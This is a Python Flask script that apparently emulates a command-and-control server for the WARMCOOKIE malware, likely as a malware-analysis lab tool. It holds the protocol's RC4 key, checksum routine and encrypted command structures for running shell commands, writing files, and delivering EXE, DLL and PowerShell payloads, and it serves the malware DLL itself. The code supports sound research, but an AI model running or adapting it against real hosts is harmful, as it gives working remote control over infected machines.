from flask import Flask, Response, send_file, request
from Crypto.Cipher import ARC4
import struct
import ctypes


app = Flask(__name__)

RC4_KEY = "83ddc084e21a244c"

COMMAND_ID = 0x00000001

DLL_PATH = "mare_test.dll"  # INSERT DLL PATH HERE
DLL_EXPORT = b"Start\x00"  # INSERT DLL EXPORT HERE
EXE_PATH = "mare_test.exe"  # INSERT EXE PATH HERE
PS1_PATH = "mare_test.ps1"  # INSERT PS1 PATH HERE
COMMAND = b"whoami"  # INSERT COMMDAND
FILE_PATH = b"C:\\tmp\\meow.txt\x00"  # INSERT FILE PATH FOR CREATION
FILE_DATA = b"meow"  # INSERT DATA FOR NEW FILE

WARMCOOKIE_DLL = "/malwares/f4d2c9470b322af29b9188a3a590cbe85bacb9cc8fcd7c2e94d82271ded3f659"  # INSERT WARMCOOKIE DLL PATH


class Header(ctypes.Structure):
    _pack_ = 1
    _fields_ = [
        ("value1", ctypes.c_uint32),
        ("command_id", ctypes.c_uint32),
    ]


def new_handler_4_parameter(command: bytes):
    class Handler4(ctypes.Structure):
        _pack_ = 1
        _fields_ = [
            ("length_cmd", ctypes.c_uint32),
            ("field_4", ctypes.c_uint32),
            ("field8", ctypes.c_uint32),
            ("cmd", ctypes.c_char * len(command)),
        ]

    return Handler4(
        len(command),
        0xDEADBEEF,
        0xDEADBEEF,
        command,
    )


def new_handler_5_parameter(filepath: bytes, file_content: bytes):
    class Handler5(ctypes.Structure):
        _pack_ = 1
        _fields_ = [
            ("field_0", ctypes.c_uint32),
            ("field_4", ctypes.c_uint32),
            ("field8", ctypes.c_uint32),
            ("offset", ctypes.c_uint32),
            ("file_content_size", ctypes.c_uint32),
            ("filepath", ctypes.c_char * len(filepath)),
            ("file_content", ctypes.c_char * len(file_content)),
        ]

    return Handler5(
        0xDEADBEEF,
        0xDEADBEEF,
        0xDEADBEEF,
        0x30,
        len(file_content),
        filepath,
        file_content,
    )


def new_handler_6_parameter(filepath: bytes):
    class Handler6(ctypes.Structure):
        _pack_ = 1
        _fields_ = [
            ("field_0", ctypes.c_uint32),
            ("field_4", ctypes.c_uint32),
            ("size_file_path", ctypes.c_uint32),
            ("filepath", ctypes.c_char * len(filepath)),
        ]

    return Handler6(
        0xDEADBEEF,
        0xDEADBEEF,
        len(filepath),
        filepath,
    )


def new_handler_7_parameter(file_content: bytes):
    class Handler7(ctypes.Structure):
        _pack_ = 1
        _fields_ = [
            ("field_0", ctypes.c_uint32),
            ("field_4", ctypes.c_uint32),
            ("field8", ctypes.c_uint32),
            ("offset", ctypes.c_uint32),
            ("file_content_size", ctypes.c_uint32),
            ("file_content", ctypes.c_ubyte * len(file_content)),
        ]

    file_content_array = (ctypes.c_ubyte * len(file_content))(*file_content)

    return Handler7(
        0xDEADBEEF,
        0xDEADBEEF,
        0xDEADBEEF,
        0x20,
        len(file_content),
        file_content_array,
    )


def new_handler_8_parameter(
    export: bytes,
    file_content: bytes,
):
    class Handler8(ctypes.Structure):
        _pack_ = 1
        _fields_ = [
            ("field_0", ctypes.c_uint32),
            ("size_export", ctypes.c_uint32),
            ("field_8", ctypes.c_uint32),
            ("offset_plus_export_size", ctypes.c_uint32),
            ("size_file_content", ctypes.c_uint32),
            ("export", ctypes.c_char * len(export)),
            ("file_content", ctypes.c_ubyte * len(file_content)),
        ]

    file_content_array = (ctypes.c_ubyte * len(file_content))(*file_content)

    return Handler8(
        0xDEADBEEF,
        len(export),
        0xDEADBEEF,
        0x20 + len(export),
        len(file_content),
        export,
        file_content_array,
    )


def new_handler_9_parameter(script_content: bytes):
    class Handler9(ctypes.Structure):
        _pack_ = 1
        _fields_ = [
            ("field_0", ctypes.c_uint32),
            ("field_4", ctypes.c_uint32),
            ("field8", ctypes.c_uint32),
            ("offset", ctypes.c_uint32),
            ("script_content_size", ctypes.c_uint32),
            ("script_content", ctypes.c_ubyte * len(script_content)),
        ]

    script_content_array = (ctypes.c_ubyte * len(script_content))(*script_content)

    return Handler9(
        0xDEADBEEF,
        0xDEADBEEF,
        0xDEADBEEF,
        0x20,
        len(script_content),
        script_content_array,
    )


def new_handler_10_parameter(file_content: bytes):
    class Handler10(ctypes.Structure):
        _pack_ = 1
        _fields_ = [
            ("field_0", ctypes.c_uint32),
            ("offset", ctypes.c_uint32),
            ("file_content_size", ctypes.c_uint32),
            ("file_content", ctypes.c_ubyte * len(file_content)),
        ]

    file_content_array = (ctypes.c_ubyte * len(file_content))(*file_content)

    return Handler10(
        0xDEADBEEF,
        0x18,
        len(file_content),
        file_content_array,
    )


def new_handler_multi_parameter():
    class HandlerMulti(ctypes.Structure):
        _pack_ = 1
        _fields_ = [
            ("field_1", ctypes.c_uint32),
        ]

    return HandlerMulti(
        0xDEADBEEF,
    )


def build_request(value1, command_id: int, parameter: bytes) -> bytes:
    arc4 = ARC4.new(RC4_KEY.encode())
    request = bytes(Header(value1, command_id)) + parameter
    my_checksum = calculate_checksum(request, 0)
    print(f"Request Checksum: {hex(my_checksum)}")
    request = struct.pack("<I", my_checksum) + request
    return arc4.encrypt(request)


def calculate_checksum(str_input, i):
    if i == 0:
        i = 0xFFFFFFFF
    if i == -1:
        i = 0

    for idx in range(0, len(str_input), 2):
        v6 = str_input[idx] | (str_input[idx + 1] << 8)
        for _ in range(16):
            if (v6 ^ i) & 1:
                i = ((i >> 1) ^ 0xEDB88320) & 0xFFFFFFFF
            else:
                i = (i >> 1) & 0xFFFFFFFF
            v6 >>= 1

    return ~i & 0xFFFFFFFF


@app.route(
    "/data/e93629b052f25d25c92a4afaee51cc81",
    methods=["HEAD", "GET"],
    strict_slashes=False,
)
def download_dll():
    return send_file(WARMCOOKIE_DLL)


@app.route("/", methods=["GET", "POST"], strict_slashes=False)
def hello():

    global COMMAND_ID
    value1 = 0x1

    if request.method == "GET":

        if COMMAND_ID in [0x00000001, 0x00000002, 0x00000003, 0x0000000B]:
            print(f"Command Handler: {hex(COMMAND_ID)}")

            response = Response(
                build_request(value1, COMMAND_ID, new_handler_multi_parameter()),
                mimetype="application/octet-stream",
            )

            COMMAND_ID += 1
            return response

        elif COMMAND_ID == 0x00000004:
            print(f"Command Handler: {hex(COMMAND_ID)}")

            response = Response(
                build_request(
                    value1, COMMAND_ID, bytes(new_handler_4_parameter(COMMAND))
                ),
                mimetype="application/octet-stream",
            )

            COMMAND_ID += 1
            return response

        elif COMMAND_ID == 0x00000005:
            print(f"Command Handler: {hex(COMMAND_ID)}")

            response = Response(
                build_request(
                    value1,
                    COMMAND_ID,
                    bytes(new_handler_5_parameter(FILE_PATH, FILE_DATA)),
                ),
                mimetype="application/octet-stream",
            )

            COMMAND_ID += 1
            return response

        elif COMMAND_ID == 0x00000006:
            print(f"Command Handler: {hex(COMMAND_ID)}")

            response = Response(
                build_request(
                    value1,
                    COMMAND_ID,
                    bytes(new_handler_6_parameter(FILE_PATH)),
                ),
                mimetype="application/octet-stream",
            )

            COMMAND_ID += 1
            return response

        elif COMMAND_ID == 0x00000007:
            print(f"Command Handler: {hex(COMMAND_ID)}")

            with open(EXE_PATH, "rb") as exe_file:
                exe_data = exe_file.read()

            response = Response(
                build_request(
                    value1, COMMAND_ID, bytes(new_handler_7_parameter(exe_data))
                ),
                mimetype="application/octet-stream",
            )

            COMMAND_ID += 1
            return response

        elif COMMAND_ID == 0x00000008:
            print(f"Command Handler: {hex(COMMAND_ID)}")

            with open(DLL_PATH, "rb") as dll_file:
                dll_data = dll_file.read()

            response = Response(
                build_request(
                    value1,
                    COMMAND_ID,
                    bytes(new_handler_8_parameter(DLL_EXPORT, dll_data)),
                ),
                mimetype="application/octet-stream",
            )

            COMMAND_ID += 1
            return response

        elif COMMAND_ID == 0x00000009:
            print(f"Command Handler: {hex(COMMAND_ID)}")

            with open(PS1_PATH, "rb") as ps1_file:
                ps1_data = ps1_file.read()

            response = Response(
                build_request(
                    value1, COMMAND_ID, bytes(new_handler_9_parameter(ps1_data))
                ),
                mimetype="application/octet-stream",
            )

            COMMAND_ID += 1
            return response

        elif COMMAND_ID == 0x0000000A:
            print(f"Command Handler: {hex(COMMAND_ID)}")

            with open(DLL_PATH, "rb") as dll_file:
                dll_data = dll_file.read()

            response = Response(
                build_request(
                    value1, COMMAND_ID, bytes(new_handler_10_parameter(dll_data))
                ),
                mimetype="application/octet-stream",
            )

            COMMAND_ID += 1
            return response

        else:
            return Response("Command not supported", status=400)

    elif request.method == "POST":
        return Response("POST request received", status=200)


if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=80)
